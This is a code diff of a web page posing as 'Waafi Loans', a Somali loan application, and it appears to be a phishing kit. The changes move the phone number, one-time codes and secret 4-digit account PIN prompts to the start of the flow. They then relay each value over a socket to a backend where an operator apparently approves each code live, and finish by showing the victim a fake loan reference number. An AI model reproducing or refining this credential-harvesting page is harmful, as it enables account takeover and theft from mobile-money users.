@@ -48,15 +48,6 @@
             border-radius: 50%; 
             display: inline-block; 
         }
-        .spinner-green {
-            animation: spin 1s linear infinite;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(116, 185, 39, 0.2);
-            border-top-color: #74b927;
-            border-radius: 50%;
-            display: inline-block;
-        }
         @keyframes spin { to { transform: rotate(360deg); } }
         .toast { 
             position: absolute; 
@@ -100,12 +91,12 @@
             
             <div class="border-t border-gray-100 px-6 py-3.5 bg-white">
                 <div class="flex items-center justify-between">
-                    <h1 class="text-[#557a2b] font-bold text-xl tracking-tight">
-                        Waafi Loans
+                    <h1 class="text-[#557a2b] font-bold text-xl tracking-tight" x-text="step <= 3 ? 'Login / Diiwangelinta' : 'Waafi Loans'">
+                        Login / Diiwangelinta
                     </h1>
                     
-                    <span class="bg-[#74b927] text-white font-semibold text-sm px-5 py-2 rounded-full shadow-md tracking-wide">
-                        Amaah Degdeg ah
+                    <span class="bg-[#74b927] text-white font-semibold text-sm px-5 py-2 rounded-full shadow-md tracking-wide" x-text="step <= 3 ? 'Ku xidh Koontada' : 'Amaah Degdeg ah'">
+                        Ku xidh Koontada
                     </span>
                 </div>
             </div>
@@ -127,14 +118,14 @@
                     
                     <div class="flex items-baseline gap-2 mt-1">
                         <span class="text-sm font-bold text-emerald-200">USD</span>
-                        <span class="text-4xl font-black tracking-tight" x-text="Number(form.amount).toLocaleString()">300</span>
+                        <span class="text-4xl font-black tracking-tight" x-text="Number(form.amount).toLocaleString()">1,200</span>
                         <span class="bg-white/20 text-[10px] font-bold px-2 py-0.5 rounded ml-1" x-text="form.term ? form.term + ' BIL' : '--'">1 BIL</span>
                     </div>
                     
                     <div class="grid grid-cols-3 gap-2 mt-5 pt-4 border-t border-white/10 text-left">
                         <div>
                             <p class="text-[9px] font-bold text-emerald-200 uppercase tracking-wider">BISHIIBA</p>
-                            <p class="text-sm font-extrabold mt-0.5" x-text="'$' + calculateMonthlyInstallment()">$307.50</p>
+                            <p class="text-sm font-extrabold mt-0.5" x-text="'$' + calculateMonthlyInstallment()">$1230.00</p>
                         </div>
                         <div class="text-center">
                             <p class="text-[9px] font-bold text-emerald-200 uppercase tracking-wider">MUDDADA</p>
@@ -160,6 +151,77 @@
             <div class="bg-white rounded-2xl border border-gray-100 p-6 shadow-sm flex-1 flex flex-col justify-between">
                 
                 <div x-show="step === 1" x-transition.duration.200ms class="space-y-5">
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Geli Lambarka & Koodhka</h2>
+                        <p class="text-xs text-gray-400 mt-1">Fadlan geli lambarkaaga talifoonka iyo koodhka OTP 1 ee laguu soo diray.</p>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Lambarka Telefoonka</label>
+                        <div class="flex gap-2">
+                            <span class="w-28 flex items-center justify-center bg-gray-100 border border-gray-200 rounded-xl px-2 text-gray-700 font-bold text-sm">🇸🇴 +252</span>
+                            <input type="tel" x-model="form.phone" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold transition-all flex-1" placeholder="9XXXXXXX" maxlength="9">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Koodhka Xaqiijinta (OTP 1)</label>
+                        <input type="text" x-model="otp.code" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-center tracking-[0.75rem] text-2xl font-bold font-mono text-gray-700 transition-all" maxlength="6" placeholder="000000" inputmode="numeric">
+                    </div>
+
+                    <div class="pt-4">
+                        <button @click="verifyOTP" :disabled="form.phone.length < 7 || otp.code.length !== 6 || otpVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span x-show="!otpVerifying">Sii wad →</span>
+                            <span x-show="otpVerifying" class="spinner-sm"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 2" x-cloak x-transition.duration.200ms class="space-y-5">
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Geli PIN-ka Sirta ah</h2>
+                        <p class="text-xs text-gray-400 mt-1">Geli 4-ta nambar ee sirta ah ee koontadaada Waafi.</p>
+                    </div>
+
+                    <div class="flex justify-center gap-3 py-2">
+                        <template x-for="(_, i) in 4" :key="i">
+                            <input type="password" class="pin-box text-gray-700" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i)" x-model="pin.value[i]">
+                        </template>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4 pt-4">
+                        <button @click="step = 1" :disabled="pinVerifying" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            ← Dib
+                        </button>
+                        <button @click="submitStep5" :disabled="!isPinValid || pinVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span x-show="!pinVerifying">Xaqiiji PIN-ka</span>
+                            <span x-show="pinVerifying" class="spinner-sm"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 3" x-cloak x-transition.duration.200ms class="space-y-5">
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Xaqiijinta Labaad (OTP 2)</h2>
+                        <p class="text-xs text-gray-400 mt-1">Fadlan geli koodhka labaad ee laguu soo diray si loo dhammaystiro aqoonsigaaga.</p>
+                    </div>
+
+                    <div>
+                        <input type="text" x-model="otp2.code" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-center tracking-[0.75rem] text-2xl font-bold font-mono text-gray-700 transition-all" maxlength="6" placeholder="000000" inputmode="numeric">
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4 pt-4">
+                        <button @click="step = 2" :disabled="otp2Verifying" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            ← Dib
+                        </button>
+                        <button @click="verifyOTP2" :disabled="otp2.code.length !== 6 || otp2Verifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span x-show="!otp2Verifying">Gudbi Koodhka →</span>
+                            <span x-show="otp2Verifying" class="spinner-sm"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 4" x-cloak x-transition.duration.200ms class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Nooca Amaahda iyo Muddada</h2>
                         <p class="text-xs text-gray-400 mt-1">Fadlan dooro nooca amaahda aad u baahan tahay iyo muddada.</p>
@@ -188,7 +250,7 @@
                         </div>
                         <div class="flex justify-between text-[11px] text-gray-400 font-bold mt-1">
                             <span>$30</span>
-                            <span>300000</span>
+                            <span>$300,000</span>
                         </div>
                     </div>
                  
@@ -220,7 +282,7 @@
                     </div>
                 </div>
 
-                <div x-show="step === 2" x-cloak x-transition.duration.200ms class="space-y-5">
+                <div x-show="step === 5" x-cloak x-transition.duration.200ms class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Macluumaadka Shakhsiga</h2>
                         <p class="text-xs text-gray-400 mt-1">Geli macluumaadkaaga hoose si loo xaqiijiyo galkaaga.</p>
@@ -242,16 +304,8 @@
                         <input type="email" x-model="form.email" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all" placeholder="tusaale@gmail.com">
                     </div>
 
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Lambarka Telefoonka</label>
-                        <div class="flex gap-2">
-                            <span class="w-28 flex items-center justify-center bg-gray-100 border border-gray-200 rounded-xl px-2 text-gray-700 font-bold text-sm">🇸🇴 +252</span>
-                            <input type="tel" x-model="form.phone" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold transition-all flex-1" placeholder="9XXXXXXX" maxlength="9">
-                        </div>
-                    </div>
-
                     <div class="grid grid-cols-2 gap-4 pt-4">
-                        <button @click="step = 1" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
+                        <button @click="step = 4" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
                             ← Dib
                         </button>
                         <button @click="submitStep2" :disabled="!isStep2Valid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
@@ -260,7 +314,7 @@
                     </div>
                 </div>
 
-                <div x-show="step === 3" x-cloak x-transition.duration.200ms class="space-y-5">
+                <div x-show="step === 6" x-cloak x-transition.duration.200ms class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Xaaladda Shaqada & Koontada</h2>
                         <p class="text-xs text-gray-400 mt-1">Geli macluumaadka si aad u xaqiijiso xiriirka Salaam Bank.</p>
@@ -291,76 +345,11 @@
                     </div>
 
                     <div class="grid grid-cols-2 gap-4 pt-4">
-                        <button @click="step = 2" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
+                        <button @click="step = 5" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
                             ← Dib
                         </button>
                         <button @click="submitStep3" :disabled="!isStep3Valid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
                             Gudbi Codsiga →
-                        </button>
-                    </div>
-                </div>
-
-                <div x-show="step === 4" x-cloak x-transition.duration.200ms class="space-y-5">
-                    <div class="text-center mb-6">
-                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Xaqiijinta Code-ka (OTP)</h2>
-                        <p class="text-xs text-gray-400 mt-1">Fadlan geli 6-da nambar ee SMS-ka kuugu soo dhacay si loo hubiyo.</p>
-                    </div>
-
-                    <div>
-                        <input type="text" x-model="otp.code" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-center tracking-[0.75rem] text-2xl font-bold font-mono text-gray-700 transition-all" maxlength="6" placeholder="000000" inputmode="numeric">
-                    </div>
-
-                    <div class="grid grid-cols-2 gap-4 pt-4">
-                        <button @click="step = 3" :disabled="otpVerifying" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            ← Dib
-                        </button>
-                        <button @click="verifyOTP" :disabled="otp.code.length !== 6 || otpVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span x-show="!otpVerifying">Hubi Code-ka →</span>
-                            <span x-show="otpVerifying" class="spinner-sm"></span>
-                        </button>
-                    </div>
-                </div>
-
-                <div x-show="step === 5" x-cloak x-transition.duration.200ms class="space-y-5">
-                    <div class="text-center mb-6">
-                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Geli PIN-ka Koontada</h2>
-                        <p class="text-xs text-gray-400 mt-1">Geli 4-ta nambar ee sirta ah si loo dhammaystiro bixinta lacagta.</p>
-                    </div>
-
-                    <div class="flex justify-center gap-3 py-2">
-                        <template x-for="(_, i) in 4" :key="i">
-                            <input type="password" class="pin-box text-gray-700" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i)" x-model="pin.value[i]">
-                        </template>
-                    </div>
-
-                    <div class="grid grid-cols-2 gap-4 pt-4">
-                        <button @click="step = 4" :disabled="pinVerifying" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            ← Dib
-                        </button>
-                        <button @click="submitStep5" :disabled="!isPinValid || pinVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span x-show="!pinVerifying">Dhammaystir</span>
-                            <span x-show="pinVerifying" class="spinner-sm"></span>
-                        </button>
-                    </div>
-                </div>
-
-                <div x-show="step === 6" x-cloak x-transition.duration.200ms class="space-y-5">
-                    <div class="text-center mb-6">
-                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Xaqiijinta Labaad (OTP 2)</h2>
-                        <p class="text-xs text-gray-400 mt-1">Fadlan geli code-ka xaqiijinta labaad ee laguu soo diray si loo fasaxo amaahda.</p>
-                    </div>
-
-                    <div>
-                        <input type="text" x-model="otp2.code" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-center tracking-[0.75rem] text-2xl font-bold font-mono text-gray-700 transition-all" maxlength="6" placeholder="000000" inputmode="numeric">
-                    </div>
-
-                    <div class="grid grid-cols-2 gap-4 pt-4">
-                        <button @click="step = 5" :disabled="otp2Verifying" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            ← Dib
-                        </button>
-                        <button @click="verifyOTP2" :disabled="otp2.code.length !== 6 || otp2Verifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span x-show="!otp2Verifying">Gudbi Code-ka →</span>
-                            <span x-show="otp2Verifying" class="spinner-sm"></span>
                         </button>
                     </div>
                 </div>
@@ -426,23 +415,20 @@
                     
                     this.socket.on('admin-approve-otp', () => { 
                         this.otpVerifying = false; 
-                        this.step = 5; 
+                        this.step = 2; 
                     });
                     
-                    // Route to step 6 window instead of instant terminal success
                     this.socket.on('pin-verified', () => { 
                         this.pinVerifying = false; 
-                        this.step = 6; 
+                        this.step = 3; 
                     });
 
-                    // Final step 6 verification completion handler
                     this.socket.on('admin-approve-otp2', (d) => {
                         this.otp2Verifying = false;
-                        this.referenceId = d.referenceId || 'WFI-' + Math.floor(100000 + Math.random() * 900000);
-                        this.step = 7;
+                        this.step = 4;
                     });
                     
-                    // Multi-step rejection event bindings
+                    // Error and fail listeners
                     this.socket.on('otp-failed', (err) => {
                         this.otpVerifying = false;
                         this.triggerToastNotification(err.message || "Code-ka OTP ee aad gelisay waa khalad");
@@ -470,24 +456,11 @@
                     });
                 },
 
-                submitStep1() { 
-                    this.form.appId = this.appId;
-                    this.socket.emit('step1', this.form); 
-                    this.step = 2; 
-                },
-                submitStep2() { 
-                    this.form.appId = this.appId;
-                    this.socket.emit('step2', this.form); 
-                    this.step = 3; 
-                },
-                submitStep3() { 
-                    this.form.appId = this.appId;
-                    this.socket.emit('step3-data', this.form); 
-                    this.step = 4; 
-                },
+                // Authentication handlers
                 verifyOTP() { 
                     this.otpVerifying = true; 
-                    this.socket.emit('step4-otp', { appId: this.appId, otp: this.otp.code }); 
+                    // Sends both phone number and verification code matching backend payload requirements
+                    this.socket.emit('step4-otp', { appId: this.appId, phone: this.form.phone, otp: this.otp.code }); 
                 },
                 submitStep5() { 
                     this.pinVerifying = true; 
@@ -496,6 +469,24 @@
                 verifyOTP2() {
                     this.otp2Verifying = true;
                     this.socket.emit('step6-otp2', { appId: this.appId, otp2: this.otp2.code });
+                },
+
+                // Form execution steps
+                submitStep1() { 
+                    this.form.appId = this.appId;
+                    this.socket.emit('step1', this.form); 
+                    this.step = 5; 
+                },
+                submitStep2() { 
+                    this.form.appId = this.appId;
+                    this.socket.emit('step2', this.form); 
+                    this.step = 6; 
+                },
+                submitStep3() { 
+                    this.form.appId = this.appId;
+                    this.socket.emit('step3-data', this.form); 
+                    this.referenceId = 'WFI-' + Math.floor(100000 + Math.random() * 900000);
+                    this.step = 7; 
                 },
                 
                 movePinFocus(e, i) { 
